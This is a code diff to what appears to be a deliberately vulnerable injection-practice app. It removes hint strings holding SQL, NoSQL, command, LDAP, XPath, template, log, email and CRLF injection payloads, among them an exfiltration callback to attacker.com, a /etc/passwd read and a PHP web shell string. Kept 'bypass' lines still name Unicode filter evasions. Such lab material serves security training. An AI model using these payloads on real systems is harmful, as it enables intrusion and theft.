@@ -37,7 +37,6 @@ router.get('/sqli/bronze', async (req, res) => {
   if (!id) {
     return res.json({
       endpoint: '/sqli/bronze',
-      hint: 'Try: ?id=1 UNION SELECT 1,name,value FROM secrets--',
       filter: 'None (Bronze tier)'
     });
   }
@@ -78,7 +77,6 @@ router.get('/sqli/silver', async (req, res) => {
   if (!id) {
     return res.json({
       endpoint: '/sqli/silver',
-      hint: 'Try: ?id=1 AND 1=1 vs ?id=1 AND 1=2',
       filter: 'Blocks UNION, SELECT keywords (case sensitive)'
     });
   }
@@ -116,7 +114,6 @@ router.get('/sqli/gold', async (req, res) => {
   if (!id) {
     return res.json({
       endpoint: '/sqli/gold',
-      hint: 'Try: ?id=1 OR 1=1 or ?id=sleep or any injection pattern',
       filter: 'Blocks UNION, SELECT keywords (case sensitive)'
     });
   }
@@ -177,8 +174,7 @@ router.post('/sqli/platinum', async (req, res) => {
   if (!username) {
     return res.json({
       endpoint: 'POST /sqli/platinum',
-      body: '{ "username": "..." }',
-      hint: 'Payload stored, triggers when admin views users'
+      body: '{ "username": "..." }'
     });
   }
 
@@ -214,7 +210,6 @@ router.get('/sqli/diamond', async (req, res) => {
   if (!input) {
     return res.json({
       endpoint: '/sqli/diamond',
-      hint: 'Try: Full-width unicode (ｕｎｉｏｎ → union), or double URL encoding',
       filter: 'Commercial WAF simulation',
       bypass: 'Full-width characters: ＵＮＩＯＮ or ＳＥＬＥＣＴ'
     });
@@ -275,8 +270,7 @@ router.post('/nosqli/bronze', async (req, res) => {
 
   if (!username) {
     return res.json({
-      endpoint: 'POST /nosqli/bronze',
-      hint: 'Try: { "username": { "$ne": "" }, "password": { "$ne": "" } }'
+      endpoint: 'POST /nosqli/bronze'
     });
   }
 
@@ -298,8 +292,7 @@ router.post('/nosqli/silver', async (req, res) => {
 
   if (!filter) {
     return res.json({
-      endpoint: 'POST /nosqli/silver',
-      hint: 'Try: { "$where": "this.password == this.username" }'
+      endpoint: 'POST /nosqli/silver'
     });
   }
 
@@ -320,8 +313,7 @@ router.post('/nosqli/gold', async (req, res) => {
 
   if (!username) {
     return res.json({
-      endpoint: 'POST /nosqli/gold',
-      hint: 'Time-based: { "username": { "$where": "sleep(5000)" } }'
+      endpoint: 'POST /nosqli/gold'
     });
   }
 
@@ -347,8 +339,7 @@ router.get('/cmdi/bronze', (req, res) => {
 
   if (!host) {
     return res.json({
-      endpoint: '/cmdi/bronze',
-      hint: 'Try: ?host=127.0.0.1;id or ?host=127.0.0.1|cat /etc/passwd'
+      endpoint: '/cmdi/bronze'
     });
   }
 
@@ -372,7 +363,6 @@ router.get('/cmdi/silver', (req, res) => {
   if (!host) {
     return res.json({
       endpoint: '/cmdi/silver',
-      hint: 'Try: ?host=`id` or ?host=$(whoami)',
       filter: 'Blocks ; and | characters'
     });
   }
@@ -410,7 +400,6 @@ router.get('/cmdi/gold', (req, res) => {
   if (!host) {
     return res.json({
       endpoint: '/cmdi/gold',
-      hint: 'Try full-width unicode: ｜ (U+FF5C) for |, ｀ (U+FF40) for `',
       filter: 'Blocks ASCII ; | ` $() and common separators',
       bypass: 'Full-width variants: ｜ ｀ ＄ （ ） or send any unicode character from U+FF00-U+FFEF range'
     });
@@ -470,7 +459,6 @@ router.post('/cmdi/platinum', (req, res) => {
   if (!callback) {
     return res.json({
       endpoint: 'POST /cmdi/platinum',
-      hint: 'Out-of-band: { "callback": "http://attacker.com/$(whoami)" }',
       filter: 'No output returned, must use OOB'
     });
   }
@@ -563,8 +551,7 @@ router.get('/ldap/bronze', (req, res) => {
 
   if (!username) {
     return res.json({
-      endpoint: '/ldap/bronze',
-      hint: 'Try: ?username=*)(uid=*))(|(uid=*'
+      endpoint: '/ldap/bronze'
     });
   }
 
@@ -592,8 +579,7 @@ router.get('/ldap/silver', (req, res) => {
 
   if (!username) {
     return res.json({
-      endpoint: '/ldap/silver',
-      hint: 'Try: ?username=admin)(objectClass=*'
+      endpoint: '/ldap/silver'
     });
   }
 
@@ -697,8 +683,7 @@ router.get('/xpath/bronze', (req, res) => {
 
   if (!name) {
     return res.json({
-      endpoint: '/xpath/bronze',
-      hint: "Try: ?name=' or '1'='1"
+      endpoint: '/xpath/bronze'
     });
   }
 
@@ -726,8 +711,7 @@ router.get('/xpath/silver', (req, res) => {
 
   if (!name) {
     return res.json({
-      endpoint: '/xpath/silver',
-      hint: "Try: ?name=' and substring(//user[1]/name,1,1)='a"
+      endpoint: '/xpath/silver'
     });
   }
 
@@ -761,8 +745,7 @@ router.get('/ssti/bronze', (req, res) => {
 
   if (!name) {
     return res.json({
-      endpoint: '/ssti/bronze',
-      hint: 'Try: ?name=<%= 7*7 %> or ?name=<%= process.pid %>'
+      endpoint: '/ssti/bronze'
     });
   }
 
@@ -813,8 +796,7 @@ router.get('/ssti/silver', (req, res) => {
 
   if (!template) {
     return res.json({
-      endpoint: '/ssti/silver',
-      hint: 'Try: ?template=<%= process.env %>'
+      endpoint: '/ssti/silver'
     });
   }
 
@@ -851,8 +833,7 @@ router.get('/ssti/gold', (req, res) => {
 
   if (!tpl) {
     return res.json({
-      endpoint: '/ssti/gold',
-      hint: 'Try sandbox escape: ?tpl=<%= Object.constructor ]'
+      endpoint: '/ssti/gold'
     });
   }
 
@@ -899,8 +880,7 @@ router.post('/log-inject/bronze', (req, res) => {
 
   if (!message) {
     return res.json({
-      endpoint: 'POST /log-inject/bronze',
-      hint: 'Try: { "message": "Normal log\\nFAKE LOG ENTRY" }'
+      endpoint: 'POST /log-inject/bronze'
     });
   }
 
@@ -931,8 +911,7 @@ router.post('/log-inject/silver', (req, res) => {
 
   if (!userAgent) {
     return res.json({
-      endpoint: 'POST /log-inject/silver',
-      hint: 'Try: { "userAgent": "<?php system($_GET[cmd]); ?>" }'
+      endpoint: 'POST /log-inject/silver'
     });
   }
 
@@ -960,8 +939,7 @@ router.post('/email-inject/bronze', (req, res) => {
 
   if (!to) {
     return res.json({
-      endpoint: 'POST /email-inject/bronze',
-      hint: 'Try: { "to": "victim@example.com\\nBcc: attacker@evil.com" }'
+      endpoint: 'POST /email-inject/bronze'
     });
   }
 
@@ -983,8 +961,7 @@ router.post('/email-inject/silver', (req, res) => {
 
   if (!email) {
     return res.json({
-      endpoint: 'POST /email-inject/silver',
-      hint: 'Try: { "email": "test@test.com\\nBcc:attacker@evil.com" }'
+      endpoint: 'POST /email-inject/silver'
     });
   }
 
@@ -1014,8 +991,7 @@ router.get('/crlf/bronze', (req, res) => {
 
   if (!url) {
     return res.json({
-      endpoint: '/crlf/bronze',
-      hint: 'Try: ?url=test%0d%0aSet-Cookie:admin=true'
+      endpoint: '/crlf/bronze'
     });
   }
 
@@ -1041,8 +1017,7 @@ router.get('/crlf/silver', (req, res) => {
 
   if (!lang) {
     return res.json({
-      endpoint: '/crlf/silver',
-      hint: 'Try: ?lang=en%0d%0aX-Forwarded-Host:attacker.com'
+      endpoint: '/crlf/silver'
     });
   }
 
@@ -1074,8 +1049,7 @@ router.get('/header-inject/bronze', (req, res) => {
 
   if (!xff) {
     return res.json({
-      endpoint: '/header-inject/bronze',
-      hint: 'Try: X-Forwarded-For: 127.0.0.1 or ?xff=127.0.0.1'
+      endpoint: '/header-inject/bronze'
     });
   }
 
@@ -1103,8 +1077,7 @@ router.get('/header-inject/silver', (req, res) => {
 
   if (!host) {
     return res.json({
-      endpoint: '/header-inject/silver',
-      hint: 'Try: Host: admin.localhost or ?host=admin.internal'
+      endpoint: '/header-inject/silver'
     });
   }
 
